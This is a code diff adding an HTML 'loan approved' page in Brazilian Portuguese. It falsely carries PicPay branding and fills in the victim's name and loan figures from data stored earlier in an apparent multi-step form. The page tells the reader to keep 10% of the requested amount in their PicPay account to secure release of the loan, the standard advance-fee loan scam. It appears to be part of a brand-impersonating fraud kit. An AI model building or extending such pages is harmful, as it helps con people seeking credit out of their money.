@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Empréstimo Aprovado</title>
+    <style>
+        .approval-card { background: #fff; padding: 40px; border-radius: 20px; text-align: center; }
+        .success-icon { font-size: 60px; color: #1db954; margin-bottom: 20px; }
+        .loan-details { background: #f9f9f9; padding: 20px; border-radius: 12px; margin: 20px 0; text-align: left; }
+        .footer-copy { margin-top: 40px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container approval-card">
+        <div class="success-icon">✓</div>
+        <h2 id="welcome-msg">Parabéns, <span id="user-name">usuário</span>!</h2>
+        <p>Seu empréstimo foi aprovado com sucesso.</p>
+
+        <div class="loan-details">
+            <p><strong>Valor solicitado:</strong> R$ <span id="loan-amount">0,00</span></p>
+            <p><strong>Prazo:</strong> <span id="loan-months">0</span> meses</p>
+            <p><strong>Valor final da parcela:</strong> R$ <span id="monthly-pay">0,00</span></p>
+        </div>
+
+        <p style="font-size: 14px; color: #555;">
+            Dentro de 24 horas, você receberá um e-mail de confirmação. 
+            <strong>Importante:</strong> Mantenha 10% do valor solicitado em sua conta PicPay 
+            para garantir a liberação imediata e a confirmação em tempo hábil.
+        </p>
+
+        <div class="footer-copy">
+            &copy; PicPay 2026. Todos os direitos reservados.
+        </div>
+    </div>
+
+    <script>
+        // Retrieve data saved during the flow
+        window.onload = () => {
+            document.getElementById('user-name').textContent = localStorage.getItem('fullName') || 'Cliente';
+            document.getElementById('loan-amount').textContent = localStorage.getItem('loanAmount') || '0,00';
+            document.getElementById('loan-months').textContent = localStorage.getItem('loanMonths') || '0';
+            document.getElementById('monthly-pay').textContent = localStorage.getItem('monthlyPayment') || '0,00';
+        };
+    </script>
+</body>
+</html>
